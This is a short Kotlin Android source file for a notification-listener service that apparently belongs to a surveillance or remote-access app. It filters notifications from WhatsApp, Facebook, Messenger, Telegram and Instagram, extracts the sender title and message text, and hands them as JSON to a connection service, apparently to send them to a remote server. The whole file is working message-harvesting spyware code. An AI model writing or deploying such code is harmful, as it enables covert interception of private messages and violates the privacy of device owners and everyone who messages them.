package com.example.admin

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotifListenerService : NotificationListenerService() {

    private val watch = setOf(
        "com.whatsapp",
        "com.facebook.katana",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.instagram.android"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val s = sbn ?: return
        if (s.packageName !in watch) return
        val ex = s.notification.extras
        val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val obj = JSONObject()
            .put("pkg", s.packageName)
            .put("title", title)
            .put("text", text)
            .put("time", s.postTime)
        ConnectionService.push(applicationContext, "notification", obj.toString())
    }
}
